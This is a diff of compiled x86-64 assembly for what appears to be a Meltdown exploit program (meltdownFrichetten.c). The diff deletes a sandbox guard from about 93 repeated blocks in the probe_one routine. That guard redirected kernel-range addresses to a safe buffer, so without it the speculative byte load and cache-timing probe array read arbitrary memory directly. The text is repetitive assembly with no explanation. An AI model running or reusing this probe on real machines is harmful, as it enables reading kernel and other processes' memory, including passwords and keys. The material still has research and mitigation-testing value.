@@ -1,4 +1,4 @@
-	.file	"meltdownNew.c"
+	.file	"meltdownFrichetten.c"
 	.text
 	.type	sigaction_segv, @function
 sigaction_segv:
@@ -75,7 +75,7 @@ probe_one:
 	movq	%rax, -2352(%rbp)
 	movq	-2352(%rbp), %rax
 #APP
-# 104 "meltdownNew.c" 1
+# 106 "meltdownFrichetten.c" 1
 	mfence
 	clflush	0(%rax)
 # 0 "" 2
@@ -92,7 +92,7 @@ probe_one:
 	movq	-2408(%rbp), %rdx
 	movq	-2416(%rbp), %rcx
 #APP
-# 156 "meltdownNew.c" 1
+# 158 "meltdownFrichetten.c" 1
 	.global __speculative_byte_load_exit 
 	92:                              
 	xorq	%rax, %rax
@@ -623,9 +623,6 @@ probe_one:
 .Lprobe_one_win0_var1:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -635,9 +632,6 @@ probe_one:
 .Lprobe_one_win0_var2:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -647,9 +641,6 @@ probe_one:
 .Lprobe_one_win0_var3:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -659,9 +650,6 @@ probe_one:
 .Lprobe_one_win0_var4:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -671,9 +659,6 @@ probe_one:
 .Lprobe_one_win0_var5:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -683,9 +668,6 @@ probe_one:
 .Lprobe_one_win0_var6:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -695,9 +677,6 @@ probe_one:
 .Lprobe_one_win0_var7:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -707,9 +686,6 @@ probe_one:
 .Lprobe_one_win0_var8:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -719,9 +695,6 @@ probe_one:
 .Lprobe_one_win0_var9:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -731,9 +704,6 @@ probe_one:
 .Lprobe_one_win0_var10:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -743,9 +713,6 @@ probe_one:
 .Lprobe_one_win0_var11:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -755,9 +722,6 @@ probe_one:
 .Lprobe_one_win0_var12:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -767,9 +731,6 @@ probe_one:
 .Lprobe_one_win0_var13:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -779,9 +740,6 @@ probe_one:
 .Lprobe_one_win0_var14:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -791,9 +749,6 @@ probe_one:
 .Lprobe_one_win0_var15:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -803,9 +758,6 @@ probe_one:
 .Lprobe_one_win0_var16:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -815,9 +767,6 @@ probe_one:
 .Lprobe_one_win0_var17:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -827,9 +776,6 @@ probe_one:
 .Lprobe_one_win0_var18:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -839,9 +785,6 @@ probe_one:
 .Lprobe_one_win0_var19:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -851,9 +794,6 @@ probe_one:
 .Lprobe_one_win0_var20:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -863,9 +803,6 @@ probe_one:
 .Lprobe_one_win0_var21:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -875,9 +812,6 @@ probe_one:
 .Lprobe_one_win0_var22:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -887,9 +821,6 @@ probe_one:
 .Lprobe_one_win0_var23:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -899,9 +830,6 @@ probe_one:
 .Lprobe_one_win0_var24:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -911,9 +839,6 @@ probe_one:
 .Lprobe_one_win0_var25:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -923,9 +848,6 @@ probe_one:
 .Lprobe_one_win0_var26:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -935,9 +857,6 @@ probe_one:
 .Lprobe_one_win0_var27:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -947,9 +866,6 @@ probe_one:
 .Lprobe_one_win0_var28:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -959,9 +875,6 @@ probe_one:
 .Lprobe_one_win0_var29:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -971,9 +884,6 @@ probe_one:
 .Lprobe_one_win0_var30:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -983,9 +893,6 @@ probe_one:
 .Lprobe_one_win0_var31:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -995,9 +902,6 @@ probe_one:
 .Lprobe_one_win0_var32:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1007,9 +911,6 @@ probe_one:
 .Lprobe_one_win0_var33:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1019,9 +920,6 @@ probe_one:
 .Lprobe_one_win0_var34:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1031,9 +929,6 @@ probe_one:
 .Lprobe_one_win0_var35:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1043,9 +938,6 @@ probe_one:
 .Lprobe_one_win0_var36:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1055,9 +947,6 @@ probe_one:
 .Lprobe_one_win0_var37:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1067,9 +956,6 @@ probe_one:
 .Lprobe_one_win0_var38:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1079,9 +965,6 @@ probe_one:
 .Lprobe_one_win0_var39:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1091,9 +974,6 @@ probe_one:
 .Lprobe_one_win0_var40:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1103,9 +983,6 @@ probe_one:
 .Lprobe_one_win0_var41:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1115,9 +992,6 @@ probe_one:
 .Lprobe_one_win0_var42:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1127,9 +1001,6 @@ probe_one:
 .Lprobe_one_win0_var43:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1139,9 +1010,6 @@ probe_one:
 .Lprobe_one_win0_var44:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1151,9 +1019,6 @@ probe_one:
 .Lprobe_one_win0_var45:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1163,9 +1028,6 @@ probe_one:
 .Lprobe_one_win0_var46:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1175,9 +1037,6 @@ probe_one:
 .Lprobe_one_win0_var47:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1187,9 +1046,6 @@ probe_one:
 .Lprobe_one_win0_var48:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1199,9 +1055,6 @@ probe_one:
 .Lprobe_one_win0_var49:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1211,9 +1064,6 @@ probe_one:
 .Lprobe_one_win0_var50:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1223,9 +1073,6 @@ probe_one:
 .Lprobe_one_win0_var51:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1235,9 +1082,6 @@ probe_one:
 .Lprobe_one_win0_var52:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1247,9 +1091,6 @@ probe_one:
 .Lprobe_one_win0_var53:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1259,9 +1100,6 @@ probe_one:
 .Lprobe_one_win0_var54:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1271,9 +1109,6 @@ probe_one:
 .Lprobe_one_win0_var55:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1283,9 +1118,6 @@ probe_one:
 .Lprobe_one_win0_var56:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1295,9 +1127,6 @@ probe_one:
 .Lprobe_one_win0_var57:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1307,9 +1136,6 @@ probe_one:
 .Lprobe_one_win0_var58:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1319,9 +1145,6 @@ probe_one:
 .Lprobe_one_win0_var59:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1331,9 +1154,6 @@ probe_one:
 .Lprobe_one_win0_var60:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1343,9 +1163,6 @@ probe_one:
 .Lprobe_one_win0_var61:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1355,9 +1172,6 @@ probe_one:
 .Lprobe_one_win0_var62:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1367,9 +1181,6 @@ probe_one:
 .Lprobe_one_win0_var63:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1379,9 +1190,6 @@ probe_one:
 .Lprobe_one_win0_var64:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1391,9 +1199,6 @@ probe_one:
 .Lprobe_one_win0_var65:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1403,9 +1208,6 @@ probe_one:
 .Lprobe_one_win0_var66:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1415,9 +1217,6 @@ probe_one:
 .Lprobe_one_win0_var67:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1427,9 +1226,6 @@ probe_one:
 .Lprobe_one_win0_var68:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1439,9 +1235,6 @@ probe_one:
 .Lprobe_one_win0_var69:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1451,9 +1244,6 @@ probe_one:
 .Lprobe_one_win0_var70:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1463,9 +1253,6 @@ probe_one:
 .Lprobe_one_win0_var71:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1475,9 +1262,6 @@ probe_one:
 .Lprobe_one_win0_var72:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1487,9 +1271,6 @@ probe_one:
 .Lprobe_one_win0_var73:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1499,9 +1280,6 @@ probe_one:
 .Lprobe_one_win0_var74:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1511,9 +1289,6 @@ probe_one:
 .Lprobe_one_win0_var75:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1523,9 +1298,6 @@ probe_one:
 .Lprobe_one_win0_var76:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1535,9 +1307,6 @@ probe_one:
 .Lprobe_one_win0_var77:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1547,9 +1316,6 @@ probe_one:
 .Lprobe_one_win0_var78:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1559,9 +1325,6 @@ probe_one:
 .Lprobe_one_win0_var79:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1571,9 +1334,6 @@ probe_one:
 .Lprobe_one_win0_var80:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1583,9 +1343,6 @@ probe_one:
 .Lprobe_one_win0_var81:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1595,9 +1352,6 @@ probe_one:
 .Lprobe_one_win0_var82:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1607,9 +1361,6 @@ probe_one:
 .Lprobe_one_win0_var83:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1619,9 +1370,6 @@ probe_one:
 .Lprobe_one_win0_var84:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1631,9 +1379,6 @@ probe_one:
 .Lprobe_one_win0_var85:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1643,9 +1388,6 @@ probe_one:
 .Lprobe_one_win0_var86:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1655,9 +1397,6 @@ probe_one:
 .Lprobe_one_win0_var87:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1667,9 +1406,6 @@ probe_one:
 .Lprobe_one_win0_var88:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1679,9 +1415,6 @@ probe_one:
 .Lprobe_one_win0_var89:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1691,9 +1424,6 @@ probe_one:
 .Lprobe_one_win0_var90:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1703,9 +1433,6 @@ probe_one:
 .Lprobe_one_win0_var91:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1715,9 +1442,6 @@ probe_one:
 .Lprobe_one_win0_var92:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1727,9 +1451,6 @@ probe_one:
 .Lprobe_one_win0_var93:
 	popq	%rax
 	addq	$32, %rsp
